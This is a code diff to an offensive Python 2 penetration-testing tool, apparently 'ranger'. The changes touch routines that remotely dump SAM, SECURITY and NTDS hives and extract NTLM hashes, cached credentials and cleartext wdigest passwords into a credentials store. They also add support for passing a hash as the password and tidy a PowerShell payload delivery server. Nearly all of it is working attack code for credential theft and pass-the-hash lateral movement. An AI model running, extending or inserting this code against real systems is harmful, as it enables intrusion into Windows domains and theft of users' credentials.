@@ -7,6 +7,7 @@ import xml.etree.ElementTree as etree
 from threading import Thread, Lock, Event
 from Queue import Queue
 from struct import unpack, pack
+from collections import OrderedDict
 try:
     import colorama
 except:
@@ -1439,7 +1440,6 @@ class DumpSecrets:
             bootKey += tmpKey[transforms[i]]
 
         logging.info('Target system bootKey: 0x%s' % bootKey.encode('hex'))
-
         return bootKey
 
     def checkNoLMHashPolicy(self):
@@ -1475,24 +1475,24 @@ class DumpSecrets:
                     self.connect()
                     self.__remoteOps  = RemoteOperations(self.__smbConnection)
                     self.__remoteOps.enableRegistry()
-                    bootKey             = self.__remoteOps.getBootKey()
+                    bootKey = self.__remoteOps.getBootKey()
                     # Let's check whether target system stores LM Hashes
                     self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
 
                 if self.__isRemote == True:
-                    SAMFileName         = self.__remoteOps.saveSAM()
+                    SAMFileName = self.__remoteOps.saveSAM()
                 else:
-                    SAMFileName         = self.__samHive
+                    SAMFileName = self.__samHive
 
-                self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
+                self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                 self.__SAMHashes.dump()
                 if self.__outputFileName is not None:
                     self.__SAMHashes.export(self.__outputFileName)
 
                 if self.__isRemote == True:
-                    SECURITYFileName    = self.__remoteOps.saveSECURITY()
+                    SECURITYFileName = self.__remoteOps.saveSECURITY()
                 else:
-                    SECURITYFileName    = self.__securityHive
+                    SECURITYFileName = self.__securityHive
 
                 self.__LSASecrets= LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote = self.__isRemote)
                 self.__LSASecrets.dumpCachedHashes()
@@ -1503,11 +1503,11 @@ class DumpSecrets:
                     self.__LSASecrets.exportSecrets(self.__outputFileName)
 
                 if self.__isRemote == True:
-                    NTDSFileName        = self.__remoteOps.saveNTDS()
+                    NTDSFileName = self.__remoteOps.saveNTDS()
                 else:
-                    NTDSFileName        = self.__ntdsFile
+                    NTDSFileName = self.__ntdsFile
 
-                self.__NTDSHashes   = NTDSHashes(NTDSFileName, bootKey, isRemote = self.__isRemote, history = self.__history, noLMHash = self.__noLMHash)
+                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote = self.__isRemote, history = self.__history, noLMHash = self.__noLMHash)
                 self.__NTDSHashes.dump()
 
                 if self.__outputFileName is not None:
@@ -3797,11 +3797,8 @@ def pwd_test(pwd, verbose, usr = None):
         if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
             LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd, usr, verbose)
     hash_count = hash.split(':')
-    #print(hash_count) #DEBUG
     if len(hash_count) != 2:
         LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd, usr, verbose)
-    #print("SID: %s LM: %s NTLM: %s HASH: %s USR: %s PWD: %s") % (SID, LM, NTLM, hash, usr, pwd) #DEBUG
-    #print(pwdump_format_hash) #DEBUG
     return(SID, LM, NTLM, hash, usr, pwd)
 
 def in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp):
@@ -3826,7 +3823,6 @@ def in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, us
         elif NTLM_temp and LM_temp:
             hash_temp = LM_temp + ":" + NTLM_temp
             temp_list[3] = hash_temp
-        temp_list[3] = hash_temp
     if not temp_list[4]:
         temp_list[4] = usr_temp
     if not temp_list[5]:
@@ -4403,30 +4399,35 @@ def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd =
             temp_key = dom_temp + "\\" + usr_temp
             message, creds_dict = logged_in_users_method(verbose, creds_dict, dom_temp, dst, data_null, usr_temp)
             message_list.append(message)
-            if not NTLM_temp:
-                message = "[-] %s\\%s NTLM hash was nullified in memory" % (dom_temp, usr_temp)
-                message_list.append(message)
-            else:
-                message = "[++] %s\\%s NTLM hash is %s" % (dom_temp, usr_temp, NTLM_temp)
-                message_list.append(message)
+            try:
+                if not NTLM_temp:
+                    message = "[-] %s\\%s NTLM hash was nullified in memory \n" % (str(dom_temp), str(usr_temp))
+                    message_list.append(message)
+                else:
+                    message = "[++] %s\\%s NTLM hash is %s \n" % (str(dom_temp), str(usr_temp), str(NTLM_temp))
+                    message_list.append(message)
+            except Exception as e:
+                print("An error occurred recording NTLM: %s") % (e)
         else:
             continue
         if temp_key in creds_dict:
-	    creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-            if NTLM_temp and not creds_dict[temp_key][1]:
-	        LM_temp = "aad3b435b51404eeaad3b435b51404ee"
-	    if not creds_dict[temp_key][1] and NTLM_temp:
-                creds_dict[temp_key][1] = LM_temp
+            creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+            if not creds_dict[temp_key][1] and NTLM_temp:
+                creds_dict[temp_key][1] = "aad3b435b51404eeaad3b435b51404ee"
             if not creds_dict[temp_key][2] and NTLM_temp:
                 creds_dict[temp_key][2] = NTLM_temp
             if not creds_dict[temp_key][3] and not creds_dict[temp_key][1] and NTLM_temp:
-                creds_dict[temp_key][3] = LM_temp + ":" + NTLM_temp
+                creds_dict[temp_key][3] = "aad3b435b51404eeaad3b435b51404ee:" + str(NTLM_temp)
             if not creds_dict[temp_key][4] and usr_temp:
                 creds_dict[temp_key][4] = usr_temp
             if not creds_dict[temp_key][6] and dom_temp:
                 creds_dict[temp_key][6] = dom_temp
         else:
+            hash_temp = "aad3b435b51404eeaad3b435b51404ee:" + str(NTLM_temp)
+            LM_temp = "aad3b435b51404eeaad3b435b51404ee"
             creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+            LM_temp = None
+            hash_temp = None
     for k, v in wdigest_dict.iteritems():
         dom_temp = v[0].lower()
         usr_temp = v[1].lower()
@@ -4435,12 +4436,15 @@ def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd =
             temp_key = dom_temp + "\\" + usr_temp
             message, creds_dict = logged_in_users_method(verbose, creds_dict, dom_temp, dst, data_null, usr_temp)
             message_list.append(message)        
-            if not pwd_temp:
-                message = "[-] %s\\%s password was nullified in memory" % (dom_temp, usr_temp)
-                message_list.append(message)
-            else:
-                message = "[++] %s\\%s password is %s" % (dom_temp, usr_temp, pwd_temp)
-                message_list.append(message)
+            try:
+                if not pwd_temp:
+                    message = "[-] %s\\%s password was nullified in memory \n" % (str(dom_temp), str(usr_temp))
+                    message_list.append(message)
+                else:
+                    message = "[++] %s\\%s password is %s \n" % (str(dom_temp), str(usr_temp), str(pwd_temp))
+                    message_list.append(message)
+            except Exception as e:
+                print("An error occurred recording passwords: %s") % (e)
         else:
             continue
         if temp_key in creds_dict:
@@ -4454,6 +4458,8 @@ def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd =
         else:
             #print(temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)#DEBUG
             creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+    set = sets.Set(message_list)
+    message_list = list(set)
     return(creds_dict, message_list)
 
 #temp_list = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, access_to_temp, cached_temp]
@@ -4726,7 +4732,7 @@ Create Pasteable Executor Attack:
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
     parser.add_argument("--update", action="store_true", dest="update", default=False, help="Updates ranger and the supporting libraries")
-    parser.add_argument('--version', action='version', version='%(prog)s 0.45b')
+    parser.add_argument('--version', action='version', version='%(prog)s 0.47b')
 
     args = parser.parse_args()
 
@@ -4964,10 +4970,10 @@ Create Pasteable Executor Attack:
         try:
            src_ip = network_ifaces[interface]['addr']
         except Exception, e:
-            print("[!] No IP address found on interface %s") % (interface)
+            print("[!] Could not identify an IP address on interface %s") % (str(interface))
 	
     if src_ip == None:
-        sys.exit("No IP address is assigned to interface %s") % (str(interface))
+        sys.exit()
 
     if target_filename:
         with open(target_filename) as f:
@@ -5187,10 +5193,14 @@ Create Pasteable Executor Attack:
     #Prevents the entire matrix being run against ranges, the matrix is intended for data reloads not brute force attacks
     if creds_matrix and creds_dict_status:
         creds_dict = matrix_read(creds_matrix)
-    elif not creds_dict_status:
+    elif not creds_dict_status and ":" not in pwd:
         sys.exit("[!] The Creds Matrix holds data from other sessions the tool still needs to know what to do, provide an initial credential set to move forward")
+    if ":" in pwd and not usr:
+        SID, LM, NTLM, hash, usr, pwd = pwd_test(pwd, verbose)
+    elif ":" in pwd and usr:
+        SID, LM, NTLM, hash, usr, pwd = pwd_test(pwd, verbose, usr)
 
-    if powershell and not downloader:
+    if powershell and not (downloader or sam_dump):
         try:
             srv = delivery_server(src_port, cwd, delivery, share_name)
             if not srv:
